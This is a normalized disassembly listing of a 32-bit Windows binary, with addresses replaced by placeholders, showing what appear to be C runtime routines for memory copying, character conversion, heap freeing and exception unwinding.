mov eax [ rw-data ]
mov [ ebp - 0x4 ] esi
mov edi eax
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_100193bf
push 0x20
call sub_1001a818
pop ecx
cmp eax esi
je r-xdata
push esi
mov edi esi
call sub_10019468
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_1001955b
mov ecx esi
mov [ rw-data ] esi
call sub_10009250
mov eax [ rw-data ]
mov [ rw-data ] eax
push esi
mov ecx eax
call sub_10019600
mov esi eax
sub_10019732
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_10019767
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_10019732
leave
retn 0x8
sub_10019788
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x8
sub_100197b5
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
pop ecx
sub_100197d7
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_1001cc63
pop ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_100076b0
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_100197fa
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
call sub_1001cc63
pop ecx
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_100076b0
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_1001982a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_10019851
mov edi edi
push esi
push edi
push 0x0
mov esi ecx
call sub_1001982a
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x28 ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_10019ce4
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x2c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_10019ce4
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_10019895
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0x0
jbe r-xdata
mov ecx esi
call sub_10019851
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
mov eax [ esi + 0x8 ]
lea eax [ eax + rw-data ]
dec [ eax ]
cmp [ eax ] 0x0
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_100092d0
push esi
call sub_10019ce4
pop ecx
sub_100198d3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_1001bc96
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_1001bc70
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_1001b723
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_1001b81c
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_1001b6dd
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_100199e5
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_1001a818
push eax
mov [ esi ] eax
call sub_10019a80
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_10019a2f
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_1001bec9
push esi
call sub_1001a3eb
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_10019ac0
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ rw-data ]
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
pop ebp
jmp sub_1001da9f
sub_10019b47
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_1001cbb0
lea esi [ eax + 0x1 ]
push esi
call sub_1001aa2a
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_1001daf3
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_10019ba5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_10019b47
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10019bcc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_10019b87
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_10019b47
jmp r-xdata
sub_10019c0c
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_10019ba5
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10019c2a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10019b87
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
pop ecx
sub_10019c51
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_10019bcc
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10019ca3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10019c93
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
pop ecx
sub_10019cc4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_1001dbd0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_10019cf0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10019d74 ]
jmp [ ecx * 4 + jump_table_10019df4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10019e60 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_10019ffc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10019f00 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10019ffc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10019e60 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10019ffc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10019e60 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10019e60 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10019e60 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10019ffc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10019ffc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10019ffc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_1001a060
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1001a0e4 ]
jmp [ ecx * 4 + jump_table_1001a164 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1001a1d0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1001a36c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1001a270 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001a36c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1001a1d0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1001a36c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1001a1d0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1001a1d0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1001a1d0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001a36c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001a36c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001a36c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_1001a3eb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_1001bddd
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1001bd9b
pop ecx
mov [ esi ] eax
pop esi
sub_1001a425
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_1001a45e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1001a4b2
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001d8d5
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_1001a4e8
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_1001a809
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001d8d5
add esp 0x20
pop esi
pop ebp
retn
sub_1001a51b
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_1001a5f2
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_1001e316
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_1001a5f2
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
